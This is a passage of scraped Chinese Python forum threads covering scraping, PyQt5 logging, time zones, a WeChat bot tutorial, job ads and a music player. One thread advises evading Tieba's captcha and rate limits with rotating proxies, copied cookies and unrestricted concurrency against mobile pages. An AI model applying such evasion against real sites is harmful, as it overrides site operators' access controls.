rel=\"stylesheet\" type=\"text/css\" href=\"http://tb1.bdstatic.com/tb/_/cui/frscaptcha/node_modules/tb-captcha/node_modules/tb-icon/lib/font_af3f10d.css\" /&gt;\n    &lt;link rel=\"stylesheet\" type=\"text/css\" href=\"http://tb1.bdstatic.com/tb/_/cui/frscaptcha/node_modules/tb-captcha/lib/captcha/core/index_6cc78b2.css\" /&gt;\n    &lt;link rel=\"stylesheet\" type=\"text/css\" href=\"http://tb1.bdstatic.com/tb/_/cui/frscaptcha/routes/home/index_1357dd3.css\" /&gt;\n    &lt;link rel=\"stylesheet\" type=\"text/css\" href=\"http://tb1.bdstatic.com/tb/_/cui/frscaptcha/index_75e7e66.css\" /&gt;\n&lt;/head&gt;\n\n&lt;body&gt;\n    &lt;div id=\"react-dom\"&gt;&lt;/div&gt;\n\n&lt;script type=\"text/javascript\" src=\"http://tb1.bdstatic.com/tb/_/cui/frscaptcha/mod_c630892.js\"&gt;&lt;/script&gt;\n&lt;script type=\"text/javascript\"&gt;!function(){var e=500,t=function(){var t=document.documentElement.clientWidth/e;t=screen.width/e;var n=document.querySelector('meta[name=\"viewport\"]');n.setAttribute(\"content\",\"width=\"+e+\",initial-scale=\"+t+\",maximum-scale=\"+t+\", minimum-scale=\"+t+\",user-scalable=no,target-densitydpi=device-dpi\")};t(),window.onload=function(){document.documentElement.clientWidth&gt;750&amp;&amp;(document.getElementById(\"react-dom\").style.margin=\"0 auto\",document.getElementById(\"react-dom\").style.width=e+\"px\")}}();&lt;/script&gt;\n&lt;script type=\"text/javascript\" src=\"http://tb1.bdstatic.com/tb/_/cui/frscaptcha/pkg/aio_1436556.js\"&gt;&lt;/script&gt;\n&lt;/body&gt;&lt;/html&gt;\n\n</code></pre>\n<p>**之前用网上的所谓高匿代理，然后用 python 代码检测是否为高匿名，结果发现 100 个中有 1~2 个高匿。。。之前爬 tieba 的时候，以为自己用了高匿名，就没有加 sleep 并启用了多进程，我主机的 ip 应该就封了。。。</p>\n<p>**但是现在用检测好的高匿名代理，去爬网站，也是要输入验证码呀，这是怎回事呢？</p>\n</div></div>"], "reply": "7", "tittle": "爬虫的时候，分析列表页的规律后，直接 get 让输如验证码或者其他", "comment": ["chrome 的 headers 完整复制到 requests", "直接爬客户端接口是没有验证码的，任何情况下写爬虫都应该是优先考虑客户端接口。", "我的 github.com/cw1997 上有相关项目（仓库名忘了，你找找）你可以参考参考。", " cookie 也复制？\r", "heades = {\r", "\"Cookie\": \"....\"\r", "....\r", "}\r", "requests.get(url, headers = headers, proxies= random.choice(proxy_dicts))\r", "复制了 cookie ，使用单一 cookie ，但是每次使用的 proxy 并不一样，这个会有影响么？", " 有，会导致异地登陆", "不要抓 PC 的分页，验证太多，抓 wap 版的分页，随意并发轻松又愉快。\r", "如果想要 PC 版贴子内容的数据，抓完分页之后，自己取 kz 贴子 ID 转换成 PC 版 tieba.baidu.com/p/kzid 之类的即可。\r", "\r", "如果有心情分析 app 接口，拦截 app 接口构造请求更轻松。", " 好吧，有好的解决办法么？", " 好的，我去试试，谢啦"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>这个问题最近很困扰我。\n<img alt=\"img\" src=\"http://ww2.sinaimg.cn/large/bfb8200dly1fdk6uloz9tj20hk0b1dgk.jpg\">\n<img alt=\"img\" src=\"http://ww2.sinaimg.cn/large/bfb8200dly1fdk6ygjwbvj20i50ctgmb.jpg\"></p>\n</div></div>"], "reply": "2", "tittle": "PyCharm 的 type hint 不支持 typed version of namedtuple 吗？", "comment": ["pycharm 其实很久之前就收到 BUG 反馈了但是一直没修掉...", "  ", "   心好累"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>学校用的是 <a href=\"http://Dr.com\" rel=\"nofollow\">Dr.com</a> 的校园网客户端，有个大神用 python 写出了客户端，然后我一直在使用，最近转到了 python3 ，然后就想把那个客户端改写成 python3 的版本，然后在 string 和 bytes 这里费解了很久。</p>\n<p>python2.7 版本的代码</p>\n<p><code>t = struct.pack(\"&lt;H\", int(ran)%(0xFFFF)) #这里的 t 的 type 为 bytes</code></p>\n<p><code>s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</code></p>\n<p><code>s.sendto(\"\\x01\\x02\"+t+\"\\x09\"+\"\\x00\"*15, (svr, 61440))</code></p>\n<p>以上代码在 python3 上面运行时会报错\n<code>TypeError: Can't convert 'bytes' object to str implicitly</code></p>\n<p>然后我把那段代码改写成\n<code>s.sendto('\\x01\\x02'.encode('utf-8')+t+\"\\x09\".encode('utf-8')+\"\\x00\".encode('utf-8')*15, (svr, 61440))</code>不提示报错了，可是无法登陆。</p>\n<p>然后我用python2.7 print 了一下s.sendto的值，发现是20，然后python3 print了一下也是20，可是python3就是登陆失败，请问是我改写的代码有问题吗？</p>\n</div></div>"], "reply": "7", "tittle": "关于 python2 和 python3 的 string 和 bytes 的问题", "comment": ["只要加个 b 来表示是二进制就行了吧", "这样写也可以，更简单的写成 b'\\x01...'形式就行了\r", "不能登录是其他原因，检查一下 2/3 哪些语句变了", " 对，  但是我之前加了 b 还是不行，我以为是 python3 改了呢，是我错了。。。", " 好的，我再查查去，看来应该是别的地方有问题。", "如果没有第三方包，可以试试 Python 自带 2to3 命令。", " 已经试过了， 2to3 还没我手动好使呢…我改的这段代码， 2to3 根本就识别不出来", "查明了原因了，是因为 python3 里面 socks 需要用 bytes ，所以需要把所有关于 socks 的数据都转换成 bytes,在 github 上联系到了作者，他们打算有时间就修改一下。"]},
{"content": ["<div class=\"topic_content\">github 地址：\r<br><a target=\"_blank\" href=\"https://github.com/whatsGhost/lagou_spider\" rel=\"nofollow\">https://github.com/whatsGhost/lagou_spider</a>\r<br>\r<br>总共一百多行代码。\r<br>支持全文搜索；屏蔽公司；设置最低薪资下限，上限；最高薪资下限，上限。\r<br>搜完后会把职位信息和地址写到文本中。\r<br>\r<br><a target=\"_blank\" href=\"http://d3.freep.cn/3tb_170312162616uyml583491.png\" rel=\"nofollow\">http://d3.freep.cn/3tb_170312162616uyml583491.png</a>\r<br>\r<br>昨天下午观摩了下python的语法 ，果然还是人生苦短，要用 python    (￣ヘ￣ o ＃)</div>"], "reply": "13", "tittle": "写了一个拉勾的爬虫……", "comment": ["二楼，杭州， 14 毕业，找一个 C++ 服务端的坑。", "看得出来是写 c++的，居然能把 python 写得这么复杂", " 哈～，这锅甩给 java ，这其实是仿 java ，一个 static main 函数，各种 get/set ……", "人生苦短你用 Python 写 Java ……", "python 被你这么写也是没谁了", "拉勾拉勾 一百年不匹配的网站爬来有什么意义。。", "拉勾就是垃圾，有啥好爬的。", "scrapy 弄弄就好了吧，简单复杂化了", "经 @", " 点拨，加上我一点点 java 粗浅的功底（我还是知道 java 程序的入口在哪儿的！！）我居然明白了\r", "staticmethod decorator 的意思", "mark", "javathon ==", " ，不要在意这些细节Σ( ° △ °|||)︴", "这年头，爬一个页面的程序都能叫爬虫…"]},
{"content": ["<div class=\"topic_content\">pandas 的 groupby 结果只显示有数值的列，如何能让 groupby.mean()的结果完整的显示 dataframe 的所有列呢？ 不是数值的列，内容为空即可。 换言之， groupby 的结果保留原来 dataframe 的表结构不变。谢谢啦！！</div>"], "reply": "目前尚无回", "tittle": "pandas 的 groupby 结果只显示有数值的列，如何能让 groupby.mean()的结果完整的显示 dataframe 的所有列呢？", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>场景：采集加拿大过来的数据是加拿大的时区，加拿大每年会有东夏令时切换。抓取到的数据存储到数据库时是以北京时间存储的。但是每次到了东夏令时的切换，会导致插入的时间少了一个小时或者多一个小时。</p>\n<p>假设将采集的数据转为 UTC 存储到数据库中，在取数据时转换为当地时间是不是更为妥当一些？</p>\n</div></div>"], "reply": "5", "tittle": "Python 时区东夏令时处理有更优雅的方法吗？", "comment": ["储存为 timestamp 更合适吧", "存储用 utc 、展现用当地时区是金科玉律\r", "timestamp 不能处理闰秒", " 多谢，学习了，之前想当然了", " \r", " \r", "大概是以 Unix 时间戳更便利吧？ thx", " no"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>基本要求：</p>\n<p>Python 、 Golang 二选一吧，程度至少是掌握\n对计算机相关基础知识有较好理解，了解常用数据结构和算法  [面试不会要求你做题实现]\n熟练掌握各种存储，不限于关系型、 NoSQL\n良好的沟通能力，有团队合作精神和责任感</p>\n<p>加分项：\n开源社区活跃分子，提交过 bug 或 patch</p>\n<p>工作经验及年龄不限，仅学历要求为本科及以上。</p>\n<p>我们：</p>\n<p>知名影视圈人（也就是明星大 V 啦）组成，专注于做明星及娱乐化的众筹应用。\n背靠影视公司，有自己的现金流储备，今年也会完成 Pre A 轮融资。</p>\n<p>工作地点在  [酒仙桥 798 艺术区内]</p>\n<p>弹性无打卡制， 早上 10 - 12 点内到公司，虽然大部分人会在 12 点后才到 : (</p>\n<p>[ 8 小时工作制，无加班]</p>\n<p>薪酬根据能力评估 10k 起，无上限。</p>\n<p>重要的是，还有大量的娱乐圈福利  [具体不便透露了]</p>\n<p>请站内消息 或 puncheer@yahoo.com 邮件给我们。</p>\n<p>重要提示透露下  [请顺带附上您的 github 或知乎的个人地址]</p>\n</div></div>"], "reply": "1", "tittle": "[北京] 我们在找 Python Golang 工程师 - 娱乐众筹应用", "comment": ["有没有人来挑战下呢。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>是这样的，我用 pyqt5 写了一个 gui 程序，在主线程中用 multiprocessing 启动新的进程执行一些任务。现在我想把这个子进程的 log 输出到 ui 上，采用了添加 logging.Handler 的方式获取子进程的 log ，然后写入到 ui 中。<strong>但是问题来了，由于 qt 的进程安全机制，明明已经获取到 log 了，但是它就是不让我输出到 ui 中，通过 print 的方式是可以显示的。</strong></p>\n<p>所以想问下各位大神，我需要怎么做才能让它把 log 写到 ui 中？</p>\n<p>代码大概是这样的：</p>\n<pre><code>class MyLogHandler(logging.Handler):\n    def __init__(self, obj):\n        logging.Handler.__init__(self)\n        self.Object = obj\n\n    def emit(self, record):\n        if record.levelno&lt;self.level: return\n        tstr = time.strftime('%Y-%m-%d %H:%M:%S.%U')\n        self.Object.append(\"[%s][%s] %s\"%(tstr, record.levelname, record.getMessage()))\n        self.Object.moveCursor(QtGui.QTextCursor.End)\n\n\nmySW = MainWindow()\nhandler = MyLogHandler(mySW.loggingBrowser)\nlogging.getLogger().addHandler(handler)\nmultiprocessing.Process(pass).start()\n</code></pre>\n<p>其中的 <code>loggingBrowser</code>就是 log 显示组件。由于 logging 是模块级别的，因此主线程中的<code>MyLogHandler</code> 可以捕获到子进程的 log 输出。</p>\n<p>补充：</p>\n<p>当然，如果用多线程的话是可以的，但是不管是python的多线程还是qt的多线程，都存在无法强制结束子线程的问题。所以只能用多进程了。</p>\n</div></div>"], "reply": "20", "tittle": "关于 pyqt5 跨进程操作 ui 的问题。", "comment": ["用信号不行吗？\r", "signal = pyqtSignal(str)\r", "signal.connect(log_func) # 主线程\r", "signal.emit(log_content) # 子线程", "1L 正解", "根本就不是这个问题，在 multiprocessing 开启的子进程和父进程之间是隔离的，你所说的“由于 logging 是模块级别的，因此主线程中的 MyLogHandler 可以捕获到子进程的 log 输出。”这句话本身就不成立，你用 print 能看到输出是因为这个是子进程直接输出到 stdout 了，根本就不是你父进程捕获到的\r", "你要想解决这个问题，需要通过进程间通讯来传递你的日志信息", " 试了不行，难道是我姿势不对 ？\r", "\r", "修改之后的代码大概是这个样子的：\r", "\r", "```python\r", "\r", "class MyLogHandler(logging.Handler):\r", "    def __init__(self, obj):\r", "        logging.Handler.__init__(self)\r", "        self.Object = obj\r", "\r", "\r", "    def emit(self, record):\r", "        if record.levelno<self.level: return\r", "        tstr = time.strftime('%Y-%m-%d %H:%M:%S.%U')\r", "        self.Object.sin.emit(\"[%s][%s] %s\" %(tstr, record.levelname, record.getMessage()))\r", "        self.Object.loggingBrowser.moveCursor(QtGui.QTextCursor.End)\r", "\r", "class MainWindow(QMainWindow, Ui_MainWindow):\r", "    sin = pyqtSignal(str)\r", "    def __init__(self, parent=None):\r", "        super(MainWindow, self).__init__(parent)\r", "        self.setupUi(self)\r", "        self.sin.connect(self.loggingBrowser.append)\r", "        handler = MyLogHandler(mySW.loggingBrowser)\r", "        logging.getLogger().addHandler(handler)\r", "        ........\r", "    multiprocessing.Process(pass).start()\r", "\r", "\r", "mySW = MainWindow()\r", "\r", "\r", "```", "手误，打错了。\r", "handler = MyLogHandler(mySW.loggingBrowser)   这一行应该是  handler = MyLogHandler(mySW)", " pyqt 的 Signal 只是能跨线程，不能跨进程传输吧", " 啊，应该是的。\r", "\r", " 在主进程里面创建一个线程用来和其他进程通信，用 Queue 。然后主进程内部用 pyqtSignal 。\r", "\r", " ", " ", " 是正解", " 是的，如你所说。是我理解错了。看来只能用进程间通信了。。", " 最简单的方法就是用 @", " 的方法，而跨进程 Queue 可以使用 multiprocessing.Queue 来实现", "不过要注意 multiprocessing 类库中提供的跨进程通讯代理类的使用有一个小问题，就是不能反复创建新的线程来调用这些代理方法，否则会导致他内部创建过多的 socket 连接，最后被操作系统 kill 掉", " @", "  如果用进程间通信的话，感觉还不如用多进程。想请教下两位大神，如何强制关闭 Qthread 或 threading 生成的线程？ 我试过 Qthread 的 terminate()  wait() ， wait() 之后就会无限等待，根本不会结束。因为我要启动的子线程是不可控的，因此不可能通过修改子线程的源码来自动退出。只能是由主线程结束。", " 我记得是可以通过 cytpes 调用 cpython 的 c 函数使得在另外一个进程中强行抛出一个 BaseExecption ，具体的办法你可以自己查查", "\r", "这篇文章你可以参考参考", "差点大意了 ，果然是进程间通信", "  试了没效果。我感觉如果用进程间通信的话还不如把 log 写入文件，然后主进程去读取。反正都要保存 log 的。", " 如果多进程去读写文件容易出更多的奇奇怪怪的坑，具体的你自己衡量吧", "对了，我前面说的那个强行抛异常只适用于多线程环境，不能跨进程抛异常", " \r", "用了进程间通信之后最终还是决定使用写入文件的方式，主进程和子进程程都把 log 写入文件，需要查看的 log 的时候开一个子线程读取然后显示。我觉得这样开销会小一点。\r", "\r", "另外想问下大神，如何优化 pyqt5 的内存占用呢 ？具体见这个帖子 ", " 那你最好注意不要在主进程和子进程中同时写文件，否则…", "pyqt5 我没仔细研究过，所以帮不上你"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><em>最近想做个微信机器人，主要是为了个人方便。在<a href=\"http://www.qcloud.com/community\" rel=\"nofollow\">腾云阁</a>发现这个教程，得到了一些启发。（修改转载已取得<a href=\"http://www.qcloud.com/\" rel=\"nofollow\">腾讯云</a>授权）</em>\n<br></p>\n<h2>技术路径和实现思路</h2>\n<p><img alt=\"\" src=\"http://7vzswa.com1.z0.glb.clouddn.com/1488375172.png-lite\"> <br>\n首先编程语言使用了 Python ， Python 语法简洁、第三方扩展丰富，也因为这里采用的微信消息框架 itchat 是基于 Python 的。</p>\n<p>服务器当然使用<a href=\"http://www.qcloud.com/\" rel=\"nofollow\">腾讯云</a>，这里我使用的是单核 1G 内存的最低配置，因为作为个人用的这个配置绰绰有余了，并且以后有更多用途的时候可以直接升级服务器配置和存储，这就是云服务器的巨大优势。</p>\n<p><img alt=\"\" src=\"http://7vzswa.com1.z0.glb.clouddn.com/1488375470.png-lite\"> <br>\n因为对于大部分人来说，拿到一台崭新的服务器要部署服务是非常麻烦的，所以我也不喜欢，于是乎想到了使用 docker 容器来运行我的代码，这样不用手动去配置服务器的运行环境，我只需要创建一个 docker 镜像就可以了，但是这样感觉还是挺麻烦的，还要安装 docker ，还要上传镜像。然后我发现了 daocloud ，它可以帮助我完成容器管理和镜像生成的工作。</p>\n<p>所以我们部署路径是这样的：\n<code>编写代码</code>-&gt;<code>提交代码到 github 上</code>-&gt;<code>daocloud 自动生成 docker 镜像并部署到我们的云服务器上</code>-&gt;<code>自动运行</code></p>\n<p>也就是提交代码到分支，然后，然后自动更新发布，服务就这么运行成功了</p>\n<h2>具体过程</h2>\n<p>所以对云服务器的配置而言，我只需要为其安装 daocloud 的被控端程序即可，然后就可以再也不用管这台服务器了，太爽了吧~</p>\n<p>恰好发现<a href=\"http://www.qcloud.com/\" rel=\"nofollow\">腾讯云</a>也支持了 daocloud 的系统，在为云服务器安装系统的时候选择服务市场-Docker 容器-Daocloud 混合式容器管理平台即可。</p>\n<p>哇，那这样岂不是爽上加爽，不用登录服务器做任何配置~拿来即用，真刺激。</p>\n<p><img alt=\"\" src=\"http://7vzswa.com1.z0.glb.clouddn.com/1488377146.png-lite\"> <br>\n安装过程就不多说了，他们也提供了文档，非常简单，两行命令而已，然后我们可以在 daocloud 后台添加我们的主机了。</p>\n<p><img alt=\"\" src=\"http://7vzswa.com1.z0.glb.clouddn.com/1488375997.png-lite\"> <br>\n然后我们去创建一个项目</p>\n<p><img alt=\"\" src=\"http://7vzswa.com1.z0.glb.clouddn.com/1488376417.png-lite\"> <br>\n需要我们设置代码源，可以选择 github 和 coding ，确实比较人性化，那么我们就需要自己去 github 创建好 git 项目了，这里省略过，选择好后就可以创建了。</p>\n<p>项目创建成功后我们只需要选择我们的代码分支构建一下就好了，这时容器镜像就创建好了，下来就是部署。</p>\n<p>创建一个应用，会提示我们选择镜像来源，这里选择之前构建的镜像\n<img alt=\"\" src=\"http://7vzswa.com1.z0.glb.clouddn.com/1488376659.png-lite\"> <br>\n点击部署最新版本就好了</p>\n<p>然后我们分别在项目设置和应用设置里配置自动构建和自动部署，这样以后我们只要提交了代码， daocloud 会帮我们自动构建镜像然后部署，不需要我们自己手动操作，只需要专注代码逻辑，不用再操心部署了。</p>\n<p><img alt=\"\" src=\"http://7vzswa.com1.z0.glb.clouddn.com/1488376962.png-lite\"> <br>\n<img alt=\"\" src=\"http://7vzswa.com1.z0.glb.clouddn.com/1488376827.png-lite\"> <br>\n过程就是这么简单，腾讯云服务器作为基础，我们全程不用手动配置自己的服务器，多么轻松惬意。</p>\n<h2>程序实现</h2>\n<p>前面重点讲了服务器配置和程序部署，但是实际上部署的程序我们还没讲。\n<img alt=\"\" src=\"http://7vzswa.com1.z0.glb.clouddn.com/1488377683.png-lite\"> <br></p>\n<p>容器打包必须要有一个 Dockerfile 来告诉容器如何构建镜像，为了构建方便我们采用的 daocloud 提供的 python 镜像，以下是 dockerfile 的内容：</p>\n<pre><code>FROM daocloud.io/python:3-onbuild\nENTRYPOINT [\"python\"]\nCMD [\"run.py\"]\n\n</code></pre>\n<p>可以看到，我们启动服务的文件是<code><a href=\"http://run.py\" rel=\"nofollow\">run.py</a></code></p>\n<blockquote>\n<p><a href=\"http://run.py\" rel=\"nofollow\">run.py</a></p>\n</blockquote>\n<pre><code>#!/usr/bin/env python3\nimport bot.xiaoweiwei as wechat\ndef main():\n    wechat.run()\nif __name__ == \"__main__\":\n    main()\n\n</code></pre>\n<blockquote>\n<p><a href=\"http://xiaoweiwei.py\" rel=\"nofollow\">xiaoweiwei.py</a></p>\n<pre><code>import itchat\nfrom target.youku import YoukuData\nfrom target.qqvideo import QQVideoData\nfrom plugins.tuling import get_response\n</code></pre>\n</blockquote>\n <br>\n@itchat.msg_register('Text') <br>\ndef text_reply(msg): <br>\nitchat.send('/抠鼻',msg['FromUserName']) <br>\nreturn u'你好，请在群聊里面撩我 /微笑' <br>\n <br>\n@itchat.msg_register('Text', isGroupChat=True) <br>\ndef group_reply(msg): <br>\nif msg['isAt']: <br>\nif u'播放量' in msg['Text']: <br>\ndata = YoukuData() <br>\nif not data.check: <br>\nreturn '查询失败！' <br>\nnum = data.get_play_num() <br>\nitchat.send(u'优酷目前累计播放量为：%s' % num, msg['FromUserName']) <br>\ndata = QQVideoData() <br>\nif not data.check: <br>\nreturn '查询失败！' <br>\nnum = data.get_play_num() <br>\nreturn u'腾讯视频目前累计播放量为：%s' % num <br>\nelif u'订阅' in msg['Text']: <br>\ndata = YoukuData() <br>\nif not data.check: <br>\nreturn '查询失败！' <br>\nnum = data.get_sub_num() <br>\nreturn '目前优酷订阅人数为：%s' % num <br>\nelif '详细播放' in msg['Text']: <br>\nitchat.send('查询中...', msg['FromUserName']) <br>\ndata = YoukuData() <br>\nif not data.check: <br>\nreturn '查询失败！' <br>\nd = data.get_play_num_more() <br>\nitchat.send(d, msg['FromUserName']) <br>\ndata = QQVideoData() <br>\nif not data.check: <br>\nreturn '查询失败！' <br>\nd = data.get_play_num_more() <br>\nreturn d <br>\nelse: <br>\nreturn get_response(msg['Text'][5:]) <br>\n <br>\ndef run(): <br>\nitchat.auto_login(True,enableCmdQR=2) <br>\nitchat.run() <br>\n<pre><code>&gt;youku.py\n```python\nimport util\n\nhomepage = 'http://i.youku.com/i/UMzg0ODQyNDk4OA==/videos'\n\nclass YoukuData(object):\n\n    def __init__(self,url=homepage):\n        self.ulr = url\n        self.check = True\n        self.soup = util.get_soup(url)\n        if self.soup is None:\n            self.check = False\n\n    #获得播放量\n    def get_play_num(self):\n        vnum = self.soup.select('.vnum')\n        if vnum is not None:\n            x = vnum[0]\n            n = x.get('title')\n            num = n\n        else:\n            num = '**找不到播放量**'\n        return num\n\n    #获得订阅数\n    def get_sub_num(self):\n        snum = self.soup.select('.snum')\n        if snum is not None:\n            x = snum[0]\n            n = x.get('title')\n            num = n\n        else:\n            num = '**找不到订阅数**'\n        return num\n\n    #详细播放量\n    def get_play_num_more(self):\n        titles = self.soup.select('.v-meta-title')\n        nums = self.soup.select('.v-num')\n        times = self.soup.select('.v-publishtime')\n\n        s = ' 优酷视频-最新%d 个视频：\\n' % len(titles)\n        for x in range(len(titles)):\n            s += str(x+1) + '.'+titles[x].string+'\\n 播放量：'+nums[x].string+'\\n'\n        return s\n\n</code></pre>\n<p>这里程序实现很简单，使用的是 itchat 提供的方法，具体可以参考 itchat 项目<a href=\"https://github.com/littlecodersh/ItChat\" rel=\"nofollow\">https://github.com/littlecodersh/ItChat</a></p>\n<h2>总结</h2>\n<p>以上就是快速实现微信机器人的思路，其实主要想表达的就是现在的云技术对于开发者、对于编程初学者都是非常友好的，我们完全不必要投入过多精力在运维和发布维护上，只需要专注代码就可以。这也是云为我们生活带来的另一个方面的改变吧。 <br></p>\n<p><em>文章来自 <a href=\"https://www.qcloud.com/community/user/60367001488344385\" rel=\"nofollow\">https://www.qcloud.com/community/user/60367001488344385</a></em></p>\n</div></div>"], "reply": "目前尚无回", "tittle": "玩法收藏/云服务器/零基础微信机器人实践（ Python ）", "comment": []},
{"content": ["<div class=\"topic_content\">有意者可投简历至： <a target=\"_blank\" href=\"mailto:mayfanfan@dingtalk.com\">mayfanfan@dingtalk.com</a>\r<br>你所需要的做的：\r<br>1 、参与需求收集与整理，负责设计系统；\r<br>2 、参与系统开发、测试；\r<br>3 、系统维护；\r<br>4 、管理后端研发部；\r<br>\r<br>我们的要求：\r<br>1 、不少于 2 年的 Python 开发经验，理解 Python 哲学；\r<br>2 、熟练掌握至少一种 Python Web 框架，并有实际经验， Django 或 Flask 优先；\r<br>3 、主导过 Web 项目的设计和开发，有良好的编程理念和项目架构设计经验；\r<br>4 、熟悉 Memcache 或者 Redis ，且有实战经验；\r<br>5 、熟悉 Postgresql/MySQL/Sqlite ，掌握常用的 SQL 优化技能；\r<br>6 、了解 Linux ，知道 wsgi ，熟悉 wsgi 项目的部署;\r<br>7 、自我驱动的学习和工作习惯，对未知技术和领域能快速掌握并实践；\r<br>8 、掌握至少 1 种压力测试的方法，且有实际操作经验；\r<br>9 、有线上项目可以演示。\r<br>\r<br> [加分项] \r<br>1 、有分布式系统的开发经验；\r<br>2 、有敏捷开发的经验，熟悉 Redmine/Gitlab/Trac/Git/Hg 等工具；\r<br>3 、熟悉前端开发技术；\r<br>4 、参加过著名的 Web 产品 /项目研发；\r<br>5 、有自己的技术博客。\r<br>\r<br> \r<br>\r<br>说了辣么多\r<br>\r<br>我们来点实际的吧\r<br>\r<br>也是你们所关心的——福利\r<br>\r<br>福利在这呢：\r<br>\r<br>1.薪资： 10K~18K\r<br>\r<br>2.你不仅仅只是一个普通的工程师，你的未来：\r<br>\r<br> 发展途径：（专业岗）高级——资深——专家\r<br>\r<br>        （管理岗）团队组长——经理——总监\r<br>\r<br> 甚至是......转岗（在银刃无所不奇）只要你能，你可以！\r<br>\r<br>每半年的一次岗位晋升申请调整，还有什么公司可以这么任性？\r<br>\r<br>3.办公环境文艺优雅舒适，全是 90 后的小鲜肉，帅气老板 Nice,公司氛围好；\r<br>\r<br>4.生日=生日歌+生日红包+月生日会，结婚礼金，生育礼金；\r<br>\r<br>5.厨艺堪比星级酒店的阿姨，为我们献上营养丰富的中餐+晚餐；\r<br>\r<br>6.距家较远也不用担心，还有温馨的员工宿舍提供呢；\r<br>\r<br>7.未完待遇，不断开发 ing...</div>"], "reply": "9", "tittle": "诚聘高级 Python 工程师（包食宿） 10K-18K", "comment": ["钉钉？", "钉钉呀", "我就是问一下“无所不奇”是什么意思。。。😂", "我眼花了吗？居然没有工作地址？\r", "\r", "虽然我爱 Python ，但是发现我居然没有做过 Python Web 方面的开发， Orz ，是不是应该赶紧补一下？", "钉钉和阿里集团的招聘是独立的吗?\r", "简历 ", "\r", "不过已经投了阿里云了 :)", " 抱歉，那个是邮箱。公司是佛山市银刃信息技术服务有限公司。忘记加进去了。", " 抱歉，那个是邮箱。公司是佛山市银刃信息技术服务有限公司。忘记加进去了。", " 抱歉，那个是邮箱。公司是佛山市银刃信息技术服务有限公司。忘记加进去了。", " 抱歉，那个是邮箱。公司是佛山市银刃信息技术服务有限公司。忘记加进去了。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h1>MellPlayer</h1>\n<h2>前言</h2>\n<p>我写代码时非常喜欢听音乐，最近在网易云歌单中听到了许多入耳惊艳的歌，觉得非常不错。但是歌单的随机播放以及快速切换是个软肋，于是开发了 MellPlayer ，可以按照分类随机听歌，实现了歌单间的快速切换，希望大家能够喜欢。</p>\n<p><img alt=\"\" src=\"https://raw.githubusercontent.com/Mellcap/MellPlayer/master/document/mellplayer_tutorial.gif\"></p>\n<h2>开发理念</h2>\n<p>MellPlayer 的初版刚刚发布，还有许许多多需要改进的地方，非常希望能有志同道合的朋友 Fork 下来，一起打造越来越完美的播放器，下面就说下我的开发理念：</p>\n<blockquote>\n<p>MellPlayer 是一款命令行播放器，主要是为了实现根据心情随机听歌，并且能够快速进行歌单间的切换，简约流畅，我希望在此基础上谨慎添加小而美的功能。并不想引入过多繁琐的功能，添加一大堆的快捷键，将简洁的东西繁琐化是违背我的初衷的。</p>\n</blockquote>\n<h2>关于项目</h2>\n<p>项目地址：<a href=\"https://github.com/Mellcap/MellPlayer\" rel=\"nofollow\">MellPlayer</a></p>\n<p>项目基于 python3 开发，依赖 mpv 。还有很多地方需要优化改进，大家发现什么问题可以给我提 Issue ，当然非常欢迎有兴趣的朋友加入，一起打造我们喜欢的播放器。</p>\n<p>既然看到这儿了，就来 <a href=\"https://github.com/Mellcap/MellPlayer\" rel=\"nofollow\">Star</a> 一下， 互相 <a href=\"https://github.com/Mellcap\" rel=\"nofollow\">Follow</a> 一下吧哈哈！！！</p>\n<h3>支持</h3>\n<p>OSX &amp; Linux (Linux 未经过测试)</p>\n<h3>安装</h3>\n<p>通过 <a href=\"https://pip.pypa.io/en/stable/\" rel=\"nofollow\">pip3</a> 安装</p>\n<pre><code>[sudo] pip3 install MellPlayer\n</code></pre>\n<h3>Mac OSX 安装依赖</h3>\n<p>通过 <a href=\"https://brew.sh/\" rel=\"nofollow\">Homebrew</a> 安装 mpv</p>\n<pre><code>brew install mpv\n</code></pre>\n<h3>更新</h3>\n<p>通过 pip3 更新</p>\n<pre><code>[sudo] pip3 install MellPlayer --upgrade\n</code></pre>\n<h3>使用</h3>\n<p>在命令行直接输入 mellplayer 即可享受：</p>\n<pre><code>mellplayer\n</code></pre>\n<h3>快捷键</h3>\n<pre><code>\n 操作\n [j]     [Next Line]         ---&gt;  下\n [k]     [Prev Line]         ---&gt;  上\n [q]     [Quit]              ---&gt;  退出\n\n 音乐\n [space] [Start/Pause]       ---&gt;  播放／暂停\n [n]     [Next Song]         ---&gt;  下一曲\n [p]     [Prev Song]         ---&gt;  上一曲\n [f]     [Forward Playlist]  ---&gt;  下个歌单\n [b]     [Backward Playlist] ---&gt;  上个歌单\n\n 音量\n [-]     [Reduce Volume]     ---&gt;  减小音量\n [=]     [Increase Volume]   ---&gt;  增加音量\n [m]     [Mute]              ---&gt;  静音\n\n 歌词\n [l]     [Show/Hide Lyric]   ---&gt;  显示／关闭歌词\n\n 帮助\n [h]     [Show/Hide Help]    ---&gt;  显示／关闭帮助\n     \n</code></pre>\n</div></div>"], "reply": "63", "tittle": "开发了一款基于网易云歌单的命令行播放器，分享给大家", "comment": ["希望大家能喜欢，提一些建议。我接下来会不断的优化", "可惜用虾米", "重复了", " 可以试一下哈", " 仔细看", "网易的新版 api 好像加了加了密", "会员歌曲怎么办呢……", " 比 musicbox 好用？", " 我做的这个是基于歌单听歌的，所以都是免费的。主要是想解决歌单间随机切换的小痛点😄", " 我做的这个是基于歌单听歌的，主要是想解决歌单间随机切换的小痛点😄，并没有想做类似 musicbox 的大而全的播放器呀", " 哈哈，一看就是懂得人", "法务部门周一上班，哈哈哈", " 哈哈哈 所以趁早发", "这种东西只能拿来自娱自乐一下，没什么实际意义呀。😂", "网易花了那么大力气开发了手机端、网页版和 mac 的图形客户端 你们现在搞命令行 我要是产品经理得苦出来", "已 star py 小萌新求互 follow ？", " 代码的乐趣就在这里呀😄", " 哈哈 生命不息 折腾不止", "会被网易发律师函的小心点", " 已 follow ，互相学习", " 😓好的，多谢提醒", "之前好像有过类似的作品，后来因为版权原因项目被作者删除了", " 我这刚开发出来就听到这么悲桑的故事", " 不过我还是很支持这些项目的^_^", " 来个 star 互相 follow 一下啊", " ", " 